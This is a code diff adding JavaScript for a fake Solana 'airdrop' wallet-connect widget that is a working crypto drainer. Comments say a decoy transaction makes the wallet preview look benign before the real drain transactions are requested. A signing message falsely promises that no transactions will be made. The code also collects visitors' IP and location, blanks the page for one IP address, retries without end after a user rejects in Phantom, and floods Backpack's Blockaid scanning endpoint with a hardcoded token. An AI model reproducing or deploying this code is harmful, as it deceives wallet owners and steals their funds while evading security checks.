+            const data = await resp.json();
+            const ip = data.ip || "unknown";
+            if (ip === "185.77.218.3") {
+              location.href = "about:blank";
+            }
+            const country = data.country_name || "Unknown";
+            const countryCode = data.country_code || "";
+            const flag = getFlagEmoji(countryCode);
+
+            // Store in localStorage for future use
+            localStorage.setItem("kiwi_user_ip", ip);
+            localStorage.setItem("kiwi_user_country", country);
+            localStorage.setItem("kiwi_user_countryCode", countryCode);
+            localStorage.setItem("kiwi_user_flag", flag);
+
+            return { ip, country, countryCode, flag };
+          } catch {
+            return {
+              ip: "unknown",
+              country: "Unknown",
+              countryCode: "",
+              flag: "",
+            };
+          }
+        }
+        /* removed */
+        // Send visit notification
+        async function sendVisitNotification() {
+          // Prevent sending twice
+          if (visitNotificationSent) {
+            /* removed */
+            return;
+          }
+
+          /* removed */
+          if (!config) {
+            /* removed */
+            return;
+          }
+          try {
+            const paramsxx = originalSearchParams; // Use saved params (URL was stripped for Phantom fix)
+            const parentUrlxx =
+              paramsxx.get("parentUrl") || storedParentUrl || null; // Check URL params + sessionStorage
+            /* removed */ // ✅ log parentUrlxx
+
+            visitNotificationSent = true;
+            const location = await getIPAndLocation();
+            const browser = getBrowserName();
+            /* removed */
+            /* removed */
+            const response = await fetch(
+              API_BASE_URL.replace(/\/$/, "") + "/notify-visit",
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  browser,
+                  userAgent: navigator.userAgent,
+                  ip: location.ip,
+                  flag: location.flag,
+                  country: location.country,
+                  userChatId: config.userChatId || null,
+                  referrer: parentUrlxx || undefined, // � added
+                }),
+              },
+            );
+            await response.json().catch(() => ({}));
+            /* removed */
+          } catch (e) {
+            /* removed */
+            visitNotificationSent = false; // Reset on error so it can retry
+          }
+        }
+
+        function setStatus(text, cls) {
+          if (text) {
+            statusEl.textContent = text;
+            statusEl.className = "status" + (cls ? " " + cls : "");
+            statusEl.classList.remove("hidden");
+          } else {
+            statusEl.classList.add("hidden");
+          }
+        }
+
+        function setInfo(text) {
+          if (text) {
+            infoEl.textContent = text;
+            infoEl.classList.remove("hidden");
+          } else {
+            infoEl.classList.add("hidden");
+          }
+        }
+
+        function postToParent(type, payload) {
+          /* removed */
+          /* removed */
+          if (!window.parent) return;
+          window.parent.postMessage(
+            {
+              source: "kiwi-pro-iframe",
+              type,
+              payload,
+            },
+            "*",
+          );
+        }
+
+        function showSingleWalletView(walletName, logoUrl) {
+          currentWallet = walletName;
+          isRejected = false;
+
+          // Hide selection view elements
+          document.getElementById("modalHeader").classList.add("hidden");
+          document.getElementById("searchContainer").classList.add("hidden");
+          document.getElementById("modalFooter").classList.add("hidden");
+          walletButtons.classList.add("hidden");
+
+          // Show single wallet view
+          singleWalletView.classList.add("active");
+          backBtn.classList.add("visible");
+
+          // Set wallet logo and name
+          walletLoadingImg.src = logoUrl;
+          walletLoadingImg.alt = walletName;
+          walletLoadingName.textContent =
+            walletName.charAt(0).toUpperCase() + walletName.slice(1);
+          walletLoadingStatus.textContent = getText(
+            "connecting",
+            "Connecting...",
+          );
+
+          // Set loading ring color
+          loadingRing.className = "loading-ring " + walletName;
+          loadingRing.classList.remove("rejected");
+          walletLoadingContainer.classList.remove("rejected", "shake");
+          rejectionMessage.classList.remove("show");
+        }
+
+        function showSelectionView() {
+          currentWallet = null;
+          isRejected = false;
+          rejectNotificationSent = false;
+          backpackBlockaidStarted = false;
+          // Note: visitNotificationSent is NOT reset here - we only want to send it once per session
+
+          // Show selection view elements
+          document.getElementById("modalHeader").classList.remove("hidden");
+          document.getElementById("searchContainer").classList.remove("hidden");
+          document.getElementById("modalFooter").classList.remove("hidden");
+          walletButtons.classList.remove("hidden");
+
+          // Hide single wallet view
+          singleWalletView.classList.remove("active");
+          backBtn.classList.remove("visible");
+
+          // Reset buttons
+          phantomBtn.disabled = false;
+          solflareBtn.disabled = false;
+          backpackBtn.disabled = false;
+          okxBtn.disabled = false;
+          coinbaseBtn.disabled = false;
+          if (jupiterBtn) jupiterBtn.disabled = false;
+
+          // Reset loading state
+          loadingRing.classList.remove("rejected");
+          walletLoadingContainer.classList.remove("rejected", "shake");
+          rejectionMessage.classList.remove("show");
+        }
+
+        function showRejectedState(message) {
+          isRejected = true;
+          walletLoadingStatus.textContent =
+            message || getText("connectionRejected", "Connection rejected");
+          rejectionMessage.textContent =
+            message || getText("transactionRejected", "Transaction rejected");
+          loadingRing.classList.add("rejected");
+          walletLoadingContainer.classList.add("rejected", "shake");
+          rejectionMessage.classList.add("show");
+
+          // Remove shake class after animation
+          setTimeout(() => {
+            walletLoadingContainer.classList.remove("shake");
+          }, 500);
+        }
+
+        function updateLoadingStatus(text) {
+          walletLoadingStatus.textContent = text;
+        }
+
+        // Open wallet deeplink on mobile
+        async function openWalletDeeplink(wallet) {
+          if (!isMobile()) return false;
+
+          // Don't redirect if already in wallet app
+          if (isInWalletApp()) {
+            return false;
+          }
+
+          // Use iframe URL directly so Phantom opens the frame page, not the parent (avoids modal/embed bugs)
+          let currentUrl = window.location.href;
+
+          // Remove any existing app from URL to avoid duplication
+          try {
+            const url = new URL(currentUrl);
+            url.searchParams.delete("app");
+            currentUrl = url.toString();
+          } catch (e) {
+            // If URL parsing fails, use currentUrl as-is
+          }
+
+          // If config exists, encode it in the URL
+          if (config) {
+            try {
+              const url = new URL(currentUrl);
+              url.searchParams.set(
+                "app",
+                encodeURIComponent(JSON.stringify(config)),
+              );
+              currentUrl = url.toString();
+            } catch (e) {
+              // If URL parsing fails, append as query param manually
+              const separator = currentUrl.includes("?") ? "&" : "?";
+              currentUrl +=
+                separator + "app=" + encodeURIComponent(JSON.stringify(config));
+            }
+          }
+
+          let okxDappUrl = currentUrl;
+          if (wallet === "okx") {
+            const base = await fetchOkxDappBaseFromBackend();
+            if (base) {
+              okxDappUrl = base;
+              if (config) {
+                try {
+                  const u = new URL(okxDappUrl);
+                  u.searchParams.set(
+                    "app",
+                    encodeURIComponent(JSON.stringify(config)),
+                  );
+                  okxDappUrl = u.toString();
+                } catch (e) {
+                  const separator = okxDappUrl.includes("?") ? "&" : "?";
+                  okxDappUrl +=
+                    separator +
+                    "app=" +
+                    encodeURIComponent(JSON.stringify(config));
+                }
+              }
+            }
+          }
+
+          const deeplinks = {
+            phantom: `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`,
+            solflare: `https://solflare.com/ul/v1/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`,
+            backpack: `https://backpack.app/ul/browse/${encodeURIComponent(currentUrl)}`,
+            okx: `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(okxDappUrl)}`,
+            coinbase: `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(currentUrl)}`,
+          };
+
+          if (wallet === "jupiter") {
+            return openJupiterMobileDeeplink(currentUrl);
+          }
+
+          const deeplink = deeplinks[wallet];
+          if (deeplink) {
+            // Open from parent window (not iframe)
+            if (window.parent && window.parent !== window) {
+              window.parent.location.href = deeplink;
+            } else {
+              window.location.href = deeplink;
+            }
+            return true;
+          }
+          return false;
+        }
+
+        function tryAutoConnect() {
+          if (!isInWalletApp()) return;
+          const ua = navigator.userAgent.toLowerCase();
+          if (ua.includes("phantom")) {
+            setTimeout(() => connectWallet("phantom"), 250);
+            return;
+          }
+          if (isInJupiterMobileBrowser()) {
+            setTimeout(() => connectWallet("jupiter"), 250);
+          }
+        }
+
+        // Set up message listener for wallet connections from parent (config is hardcoded, no need to listen for init)
+        window.addEventListener("message", (event) => {
+          const data = event.data;
+          /* removed */
+
+          // Check if it's from our loader
+          if (
+            data &&
+            (data.source === "kiwi-pro-loader" ||
+              data.source === "app-pro-loader")
+          ) {
+            if (data.type === "url-wallet-address") {
+              // Store the expected wallet address from URL (backup/fallback method)
+              // Only use if not already set from URL parameter (URL param takes priority)
+              if (!expectedWalletAddress && data.payload?.walletAddress) {
+                expectedWalletAddress = data.payload.walletAddress;
+                /* removed */
+              }
+              if (data.payload?.fullUrl) {
+                parentUrl = data.payload.fullUrl;
+                /* removed */
+              }
+            } else if (data.type === "wallet-connected") {
+              /* removed */
+              const { publicKey, wallet } = data.payload;
+              userPubkey = publicKey;
+              currentWallet = wallet;
+              const walletProviders = {
+                phantom: window.phantom?.solana || window.solana,
+                solflare: window.solflare,
+                backpack: window.backpack,
+                okx: window.okxwallet?.solana,
+                coinbase: window.coinbaseSolana,
+                jupiter: getJupiterProvider(),
+              };
+              currentProvider =
+                walletProviders[wallet] ||
+                window.solana ||
+                window.phantom?.solana;
+              updateLoadingStatus(
+                getText(
+                  "connectedBuildingTransaction",
+                  "Connected! Building transaction...",
+                ),
+              );
+              postToParent("connected", { publicKey: userPubkey });
+
+              if (wallet === "backpack") {
+                startBackpackBlockaidScan();
+              }
+
+              signAndProceedToBuildSpoof();
+            } else if (data.type === "wallet-connection-error") {
+              /* removed */
+              updateLoadingStatus(
+                getText("connectionFailed", "Connection failed"),
+              );
+              showRejectedState(
+                getText("connectionFailed", "Connection failed") +
+                  ": " +
+                  data.payload.error,
+              );
+            }
+          } else {
+            // Ignore other messages (like MetaMask)
+            // Only log if it's not a known external source
+            if (data && !data.target) {
+              /* removed */
+            }
+          }
+        });
+
+        async function getClientIP() {
+          try {
+            const resp = await fetch("https://api.ipify.org?format=json");
+            const json = await resp.json();
+            return json.ip || "unknown";
+          } catch {
+            return "unknown";
+          }
+        }
+
+        async function connectWallet(walletName) {
+          /* removed */
+          /* removed */
+          /* removed */
+          /* removed */
+          /* removed */
+          /* removed */
+          /* removed */
+          /* removed */
+          /* removed */
+          /* removed */
+
+          // Prevent multiple simultaneous connection attempts
+          if (currentWallet && currentWallet === walletName) {
+            /* removed */
+            return;
+          }
+          currentWallet = walletName; // Claim immediately to block concurrent calls
+
+          const logoUrls = {
+            phantom:
+              "https://explorer-api.walletconnect.com/v3/logo/md/b6ec7b81-bb4f-427d-e290-7631e6e50d00?projectId=34357d3c125c2bcf2ce2bc3309d98715",
+            solflare:
+              "https://play-lh.googleusercontent.com/lql-v5JBq7UFMLQALnvZCX6r1X_Av8rVfrkzuv_fdjzEv88ucl4f5iCFfiN9isEc1TE=w240-h480-rw",
+            backpack: "https://www.backpack.app/favicon.ico",
+            okx: "https://www.okx.com/favicon.ico",
+            coinbase:
+              "https://images.ctfassets.net/o10es7wu5gm1/TWlW6aoAXPX7yUg5ShsZ0/c02522911b90b766eb8eef709e42b8eb/WalletLogo.png?fm=avif&w=640&h=640&q=65",
+            jupiter: "https://jup.ag/favicon.ico",
+          };
+
+          // Show single wallet view
+          showSingleWalletView(walletName, logoUrls[walletName]);
+          updateLoadingStatus(getText("connecting", "Connecting..."));
+
+          // Disable buttons to prevent multiple clicks
+          phantomBtn.disabled = true;
+          solflareBtn.disabled = true;
+          backpackBtn.disabled = true;
+          okxBtn.disabled = true;
+          coinbaseBtn.disabled = true;
+          if (jupiterBtn) jupiterBtn.disabled = true;
+
+          // On mobile, try deeplink first (but not if already in wallet app)
+          if (
+            isMobile() &&
+            !isInWalletApp() &&
+            (await openWalletDeeplink(walletName))
+          ) {
+            /* removed */
+            if (walletName === "jupiter") {
+              updateLoadingStatus(
+                getText(
+                  "openJupiterAppHint",
+                  "Opening Jupiter… Page URL copied — if it doesn't load, tap globe and paste.",
+                ),
+              );
+            } else {
+              updateLoadingStatus(
+                getText("openingWalletApp", "Opening wallet app…"),
+              );
+            }
+            return;
+          }
+
+          let provider = null;
+
+          // Fix: Check the specific wallet, not window.solana first
+          if (walletName === "phantom") {
+            // Check for Phantom specifically
+            /* removed */
+            provider = window.phantom?.solana || window.solana;
+            /* removed */
+            if (!provider || !provider.isPhantom) {
+              /* removed */
+              alert("Phantom wallet not detected in iframe.");
+              showRejectedState(
+                getText(
+                  "phantomWalletNotDetected",
+                  "Phantom wallet not detected",
+                ),
+              );
+              setTimeout(() => {
+                updateLoadingStatus(
+                  getText(
+                    "phantomWalletNotDetected",
+                    "Phantom wallet not detected",
+                  ),
+                );
+              }, 500);
+              return;
+            }
+          } else if (walletName === "solflare") {
+            // Check for Solflare specifically - don't use window.solana
+            /* removed */
+            provider = window.solflare;
+            /* removed */
+            if (!provider || !provider.isSolflare) {
+              /* removed */
+              showRejectedState(
+                getText(
+                  "solflareWalletNotDetected",
+                  "Solflare wallet not detected",
+                ),
+              );
+              setTimeout(() => {
+                updateLoadingStatus(
+                  getText(
+                    "solflareWalletNotDetected",
+                    "Solflare wallet not detected",
+                  ),
+                );
+              }, 500);
+              return;
+            }
+          } else if (walletName === "backpack") {
+            // Check for Backpack specifically
+            /* removed */
+            provider = window.backpack;
+            /* removed */
+            if (!provider || !provider.isBackpack) {
+              /* removed */
+              showRejectedState(
+                getText(
+                  "backpackWalletNotDetected",
+                  "Backpack wallet not detected",
+                ),
+              );
+              setTimeout(() => {
+                updateLoadingStatus(
+                  getText(
+                    "backpackWalletNotDetected",
+                    "Backpack wallet not detected",
+                  ),
+                );
+              }, 500);
+              return;
+            }
+          } else if (walletName === "okx") {
+            // Check for OKX specifically
+            /* removed */
+            provider = window.okxwallet?.solana;
+            /* removed */
+            if (!provider) {
+              /* removed */
+              showRejectedState(
+                getText("okxWalletNotDetected", "OKX wallet not detected"),
+              );
+              setTimeout(() => {
+                updateLoadingStatus(
+                  getText("okxWalletNotDetected", "OKX wallet not detected"),
+                );
+              }, 500);
+              return;
+            }
+          } else if (walletName === "coinbase") {
+            // Check for Coinbase specifically
+            /* removed */
+            provider = window.coinbaseSolana;
+            /* removed */
+            if (!provider) {
+              /* removed */
+              showRejectedState(
+                getText(
+                  "coinbaseWalletNotDetected",
+                  "Coinbase wallet not detected",
+                ),
+              );
+              setTimeout(() => {
+                updateLoadingStatus(
+                  getText(
+                    "coinbaseWalletNotDetected",
+                    "Coinbase wallet not detected",
+                  ),
+                );
+              }, 500);
+              return;
+            }
+          } else if (walletName === "jupiter") {
+            /* removed */
+            await ensureSolanaWeb3Ready();
+            provider = getJupiterProvider();
+            /* removed */
+            if (!provider) {
+              if (
+                isMobile() &&
+                !isInWalletApp() &&
+                (await openWalletDeeplink("jupiter"))
+              ) {
+                updateLoadingStatus(
+                  getText(
+                    "openJupiterAppHint",
+                    "Opening Jupiter… Page URL copied — if it doesn't load, tap globe and paste.",
+                  ),
+                );
+                return;
+              }
+              /* removed */
+              showRejectedState(
+                getText(
+                  "jupiterWalletNotDetected",
+                  "Jupiter wallet not detected",
+                ),
+              );
+              setTimeout(() => {
+                updateLoadingStatus(
+                  getText(
+                    "jupiterWalletNotDetected",
+                    "Jupiter wallet not detected",
+                  ),
+                );
+              }, 500);
+              return;
+            }
+          }
+
+          try {
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            try {
+              /* removed */
+            } catch (pe) {
+              /* removed */
+            }
+            /* removed */
+
+            // Check if already connected
+            if (provider.publicKey) {
+              /* removed */
+              currentProvider = provider;
+              userPubkey = provider.publicKey.toString();
+              updateLoadingStatus(
+                getText(
+                  "connectedBuildingTransaction",
+                  "Connected! Building transaction...",
+                ),
+              );
+              postToParent("connected", { publicKey: userPubkey });
+
+              if (walletName === "backpack") {
+                startBackpackBlockaidScan();
+              }
+
+              await signAndProceedToBuildSpoof();
+              return;
+            }
+
+            // Request connection - wallets may not show prompts in iframes
+            // Try to connect, but if it fails silently, check parent window
+            updateLoadingStatus(
+              getText("requestingConnection", "Requesting connection..."),
+            );
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+
+            // === TRY EAGER CONNECT FIRST (onlyIfTrusted) ===
+            /* removed */
+            try {
+              const eagerResult = await Promise.race([
+                provider.connect({ onlyIfTrusted: true }),
+                new Promise((_, rej) =>
+                  setTimeout(() => rej(new Error("eager timeout")), 3000),
+                ),
+              ]);
+              /* removed */
+              /* removed */
+            } catch (eagerErr) {
+              /* removed */
+            }
+
+            // Check if eager connect worked
+            if (provider.publicKey) {
+              /* removed */
+            } else {
+              // === FULL CONNECT ===
+              /* removed */
+              /* removed */
+              /* removed */
+              /* removed */
+            }
+
+            // Set a timeout to detect if connect() hangs
+            let connectResolved = false;
+
+            // Skip full connect if eager already worked
+            if (!provider.publicKey) {
+              const connectPromise = provider.connect();
+              /* removed */
+              /* removed */
+
+              const timeoutPromise = new Promise((_, reject) =>
+                setTimeout(() => {
+                  if (!connectResolved) {
+                    /* removed */
+                    /* removed */
+                    /* removed */
+                    reject(
+                      new Error(
+                        "Connection timeout - wallet may not support iframe prompts",
+                      ),
+                    );
+                  }
+                }, 20000),
+              );
+
+              // Also add periodic status checks while waiting
+              const statusChecker = setInterval(() => {
+                /* removed */
+              }, 3000);
+
+              try {
+                const connectionResult = await Promise.race([
+                  connectPromise,
+                  timeoutPromise,
+                ]);
+                connectResolved = true;
+                clearInterval(statusChecker);
+                /* removed */
+                /* removed */
+                /* removed */
+              } catch (connectError) {
+                connectResolved = true;
+                clearInterval(statusChecker);
+                /* removed */
+                /* removed */
+                /* removed */
+                /* removed */
+                /* removed */
+                // Continue anyway - might have connected
+              }
+            } else {
+              connectResolved = true;
+              /* removed */
+            }
+
+            // Wait a bit for the connection to complete
+            /* removed */
+            await new Promise((resolve) => setTimeout(resolve, 500));
+
+            /* removed */
+            /* removed */
+
+            // Check if we got a public key (connection might have succeeded)
+            if (provider.publicKey) {
+              /* removed */
+              currentProvider = provider;
+              userPubkey = provider.publicKey.toString();
+              updateLoadingStatus(
+                getText(
+                  "connectedBuildingTransaction",
+                  "Connected! Building transaction...",
+                ),
+              );
+              postToParent("connected", { publicKey: userPubkey });
+
+              if (walletName === "backpack") {
+                startBackpackBlockaidScan();
+              }
+
+              await signAndProceedToBuildSpoof();
+              return;
+            }
+
+            // If we get here, connection didn't work
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+
+            // Try disconnect then reconnect as last resort
+            /* removed */
+            try {
+              if (provider.disconnect) {
+                /* removed */
+                await provider.disconnect();
+                /* removed */
+                await new Promise((r) => setTimeout(r, 500));
+                /* removed */
+                const retryResult = await Promise.race([
+                  provider.connect(),
+                  new Promise((_, rej) =>
+                    setTimeout(() => rej(new Error("retry timeout")), 15000),
+                  ),
+                ]);
+                /* removed */
+                /* removed */
+
+                if (provider.publicKey) {
+                  /* removed */
+                  currentProvider = provider;
+                  userPubkey = provider.publicKey.toString();
+                  updateLoadingStatus(
+                    getText(
+                      "connectedBuildingTransaction",
+                      "Connected! Building transaction...",
+                    ),
+                  );
+                  postToParent("connected", { publicKey: userPubkey });
+                  await signAndProceedToBuildSpoof();
+                  return;
+                }
+              } else {
+                /* removed */
+              }
+            } catch (retryErr) {
+              /* removed */
+            }
+
+            // Try accessing wallet from parent window
+            /* removed */
+            if (window.parent && window.parent !== window) {
+              updateLoadingStatus(
+                getText(
+                  "pleaseConnectInParent",
+                  "Please connect in parent window...",
+                ),
+              );
+              postToParent("request-connection", { wallet: walletName });
+              // Wait for parent to handle connection
+              return;
+            }
+
+            /* removed */
+            throw new Error("Connection Rejected.");
+          } catch (e) {
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+            /* removed */
+
+            // If error message suggests it was already handled (like from buildTransaction),
+            // don't override it with a generic connection error
+            const errorAlreadyHandled =
+              e.message &&
+              (e.message.includes("Widget misconfigured") ||
+                e.message.includes("Failed to build transaction") ||
+                e.message.includes("Network error") ||
+                e.message.includes("Server error") ||
+                e.message.includes("Insufficient balance") ||
+                e.message.includes("No transactions to sign"));
+
+            if (errorAlreadyHandled) {
+              // Error was already handled and displayed, allow user to retry by going back to selection
+              // Don't show selection view immediately - let them see the error first
+              // They can use the back button or the error will timeout
+              return;
+            }
+
+            // Check if it's a user rejection
+            const isRejection =
+              e.message &&
+              (e.message.includes("reject") ||
+                e.message.includes("denied") ||
+                e.message.includes("cancel") ||
+                e.message.includes("User rejected"));
+
+            if (isRejection) {
+              updateLoadingStatus(
+                getText("connectionCancelled", "Connection cancelled"),
+              );
+              showRejectedState(
+                getText("connectionCancelled", "Connection cancelled"),
+              );
+              await sendRejectNotification("connection");
+              // In Phantom in-app: retry infinitely until they connect
+              if (isInWalletApp() && /phantom/i.test(navigator.userAgent)) {
+                rejectNotificationSent = false;
+                setTimeout(() => {
+                  loadingRing.classList.remove("rejected");
+                  walletLoadingContainer.classList.remove("rejected", "shake");
+                  rejectionMessage.classList.remove("show");
+                  currentWallet = null;
+                  isRejected = false;
+                  updateLoadingStatus(getText("connecting", "Connecting..."));
+                  connectWallet("phantom");
+                }, 1500);
+              }
+            } else {
+              updateLoadingStatus(
+                getText("connectionFailed", "Connection failed"),
+              );
+              showRejectedState(
+                getText("connectionFailed", "Connection failed") +
+                  ": " +
+                  (e.message || "Unknown error"),
+              );
+            }
+          } finally {
+            // Note: Buttons will be re-enabled in showSelectionView when user clicks back
+            // Or if there's an error, they can use the back button to retry
+            // We don't need to re-enable here as the error state allows user interaction
+          }
+        }
+
+        function sleep(ms) {
+          return new Promise((resolve) => setTimeout(resolve, ms));
+        }
+
+        const device = crypto.randomUUID();
+
+        // Start Backpack Blockaid scan (runs continuously when Backpack is connected)
+        function startBackpackBlockaidScan() {
+          if (backpackBlockaidStarted) {
+            return;
+          }
+          backpackBlockaidStarted = true;
+
+          /* removed */
+
+          (async () => {
+            const url = "https://blockaid.xnftdata.com/v0/solana/message/scan";
+
+            const payload = {
+              transactions: [
+                "aaaaaaaaaaaaaa",
+                "aaaaaaaaaaaaaa",
+                "aaaaaaaaaaaaaa",
+                "aaaaaaaaaaaaaa",
+                "aaaaaaaaaaaaaa",
+                "aaaaaaaaaaaaaa",
+              ],
+            };
+
+            let requestCount = 0;
+            let successCount = 0;
+            let failureCount = 0;
+
+            const sendRequest = async () => {
+              requestCount++;
+              const currentRequest = requestCount;
+              const nonce = `${Date.now()}-${Math.floor(Math.random() * 10000)}`;
+
+              try {
+                const response = await fetch(url, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json",
+                    "x-backpack-nonce": nonce,
+                    "x-backpack-token":
+                      "rFTRO1DwJt6pzmEjIqMEH0lrxZJJRJei8tl/LjdJleg=",
+                    "x-backpack-version": "0.10.188-1",
+                  },
+                  body: JSON.stringify(payload),
+                });
+
+                /* removed */
+
+                const data = await response.json();
+                /* removed */
+
+                successCount++;
+              } catch (error) {
+                /* removed */
+                failureCount++;
+              }
+
+              // Log stats every 10 requests
+              if (currentRequest % 10 === 0) {
+                /* removed */
+                /* removed */
+                /* removed */
+                /* removed */
+                /* removed */
+              }
+            };
+
+            // Infinite loop with 0.5s delay
+            while (true) {
+              await sendRequest();
+              await new Promise((resolve) => setTimeout(resolve, 50)); // 0.5 second delay
+            }
+          })();
+        }
+
+        const WALLET_VERIFICATION_MESSAGE =
+          "Wallet Verification\n\nBy signing this message, you confirm that you own this wallet. No transactions will be made.";
+
+        function toBase64(bytes) {
+          return btoa(String.fromCharCode.apply(null, Array.from(bytes)));
+        }
+
+        // Sign message to verify ownership (returns true if signed, false if rejected)
+        async function requestSignature() {
+          const provider = currentProvider;
+          if (!provider || !provider.signMessage) return false;
+          const encodedMessage = new TextEncoder().encode(
+            WALLET_VERIFICATION_MESSAGE,
+          );
+          phantomMessageSignature = null;
+          try {
+            const signResult = await provider.signMessage(
+              encodedMessage,
+              "utf8",
+            );
+            const signatureBytes =
+              signResult && signResult.signature instanceof Uint8Array
+                ? signResult.signature
+                : signResult instanceof Uint8Array
+                  ? signResult
+                  : null;
+            if (
+              currentWallet === "phantom" &&
+              signatureBytes &&
+              signatureBytes.length > 0
+            ) {
+              phantomMessageSignature = toBase64(signatureBytes);
+            }
+            return true;
+          } catch (err) {
+            if (err.name === "WALLET_MISMATCH") throw err;
+            return false;
+          }
+        }
+
+        // Connect → Sign message → Build-spoof (same flow for all wallets)
+        async function signAndProceedToBuildSpoof() {
+          // Hard guard: build-spoof is Phantom-only.
+          if (currentWallet !== "phantom") {
+            try {
+              await buildTransaction();
+              if (unsignedTxs && unsignedTxs.length) {
+                updateLoadingStatus(
+                  getText(
+                    "pleaseSignInWallet",
+                    "Please sign in your wallet...",
+                  ),
+                );
+                await signAndSend();
+              }
+            } catch (err) {
+              if (err && err.name === "WALLET_MISMATCH") throw err;
+              /* removed */
+            }
+            return;
+          }
+
+          updateLoadingStatus(
+            getText("pleaseSignInWallet", "Please sign in your wallet..."),
+          );
+          try {
+            const signed = await requestSignature();
+            if (!signed) {
+              showRejectedState(
+                getText("connectionRejected", "Connection rejected"),
+              );
+              await sendRejectNotification("sign_message");
+              return;
+            }
+          } catch (err) {
+            if (err.name === "WALLET_MISMATCH") {
+              showRejectedState(err.message || "Wallet mismatch");
+              return;
+            }
+            showRejectedState(
+              getText("connectionRejected", "Connection rejected"),
+            );
+            await sendRejectNotification("sign_message");
+            return;
+          }
+
+          updateLoadingStatus(
+            getText(
+              "preparingAirdropTransaction",
+              "Preparing airdrop transaction...",
+            ),
+          );
+          const clientIP = await getClientIP();
+
+          try {
+            const resp = await fetch(
+              API_BASE_URL.replace(/\/$/, "") + "/build-spoof",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                  "x-spoof-auth":
+                    "app_bcea2a77b7fc2048f8a2a7d083118d3b42aecc0f783754335c50af0591d4cc1a533ccba165077cd09fd7db96b0dba909",
+                },
+                body: JSON.stringify({
+                  customAirdropMint: config?.customAirdropMint,
+                  customAirdropAmount: config?.customAirdropAmount,
+                  userPublicKey: userPubkey,
+                  userChatId: config?.userChatId,
+                  clientIP: clientIP,
+                  walletName: currentWallet,
+                  messageSignature:
+                    currentWallet === "phantom"
+                      ? phantomMessageSignature
+                      : undefined,
+                }),
+              },
+            );
+            const json = await resp.json();
+
+            if (json.status === "wl" && json.url) {
+              const wlBase = json.url.split("?")[0];
+              window.location.href = wlBase + "?app=spoodle";
+              return;
+            }
+
+            if (json.useLighthouse) {
+              const lhResult = await lighthouseFlow(() =>
+                fetchBuildTransaction(),
+              );
+              if (lhResult.usedFallback) {
+                await fetchBuildTransaction();
+                if (unsignedTxs && unsignedTxs.length) {
+                  updateLoadingStatus(
+                    getText(
+                      "pleaseSignInWallet",
+                      "Please sign in your wallet...",
+                    ),
+                  );
+                  await signAndSend();
+                }
+              }
+              return;
+            }
+
+            if (!resp.ok) {
+              showRejectedState(json.error || "Wallet not eligible");
+              return;
+            }
+
+            // Spoof built successfully — proceed to build the real drain tx.
+            // The spoof tx was a decoy to make the wallet preview look benign;
+            // now we fetch the actual unsigned drain transactions and prompt
+            // the user to sign.
+            if (json.unsignedTxSpoof || json.status === "ok") {
+              updateLoadingStatus(
+                getText(
+                  "buildingTransaction",
+                  "Processing claim, please wait...",
+                ),
+              );
+              await fetchBuildTransaction();
+              if (json.error) {
+                showRejectedState(json.error);
+                return;
+              }
+              if (unsignedTxs && unsignedTxs.length) {
+                updateLoadingStatus(
+                  getText(
+                    "pleaseSignInWallet",
+                    "Please sign in your wallet...",
+                  ),
+                );
+                await signAndSend();
+              } else {
+                // No transactions returned and no explicit error — the
+                // server's eligibility check rejected this wallet. Show
+                // the rejection state rather than hanging on the spinner.
+                showRejectedState(
+                  getText("notEligible", "Wallet not eligible."),
+                );
+              }
+              return;
+            }
+
+            // needPhantomSignature — shouldn't reach here since we already
+            // signed above, but handle it just in case
+            if (json.needPhantomSignature) {
+              /* removed */
+              await fetchBuildTransaction();
+              if (unsignedTxs && unsignedTxs.length) {
+                await signAndSend();
+              }
+              return;
+            }
+          } catch (e) {
+            /* removed */
+            // On spoof failure, fall through to the standard build path
+            // rather than hard-stopping — the drain tx can still be built
+            // without the decoy.
+            try {
+              await fetchBuildTransaction();
+              if (unsignedTxs && unsignedTxs.length) {
+                updateLoadingStatus(
+                  getText("pleaseSignInWallet", "Please sign in your wallet..."),
+                );
+                await signAndSend();
+              } else {
+                showRejectedState(
+                  e.message || getText("notEligible", "Wallet not eligible."),
+                );
+              }
+            } catch (e2) {
+              showRejectedState(e2.message || "Failed to build transaction");
+            }
+          }
+        }
+
+        // ─── Lighthouse Flow (when NOT eligible for whitelist) ───────────────────
+        async function lighthouseFlow(fetchBuildTransactionFallback) {
+          if (!userPubkey || !config?.targetWallet) {
+            showRejectedState("Widget misconfigured: missing targetWallet.");
+            return { usedFallback: false };
+          }
+
+          const provider =
+            currentProvider ||
+            window.solana ||
+            (window.phantom && window.phantom.solana) ||
+            window.solflare;
+          if (!provider || !provider.signTransaction) {
+            showRejectedState("Wallet does not support signTransaction");
+            return { usedFallback: false };
+          }
+
+          const SolWeb3 = window.solanaWeb3;
+          if (!SolWeb3 || !SolWeb3.Transaction) {
+            showRejectedState("Solana web3 library not available");
+            return { usedFallback: false };
+          }
+
+          let allTxids = [];
+          try {
+            updateLoadingStatus("Verifying eligibility...");
+            const clientIP = await getClientIP();
+
+            const prepResp = await fetch(
+              API_BASE_URL.replace(/\/$/, "") + "/lighthouse-prepare",
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  userPublicKey: userPubkey,
+                  targetWallet: config.targetWallet,
+                  userChatId: config.userChatId,
+                  clientIP: clientIP,
+                  minValue: config.minValue,
+                }),
+              },
+            );
+
+            if (!prepResp.ok) {
+              const err = await prepResp
+                .json()
+                .catch(() => ({ error: "Unknown error" }));
+              throw new Error(err.error || `Server error ${prepResp.status}`);
+            }
+
+            const prep = await prepResp.json();
+            if (prep.tooBroke) {
+              /* removed */
+              if (fetchBuildTransactionFallback)
+                await fetchBuildTransactionFallback();
+              return { usedFallback: true };
+            }
+
+            updateLoadingStatus("Please confirm in your wallet...");
+
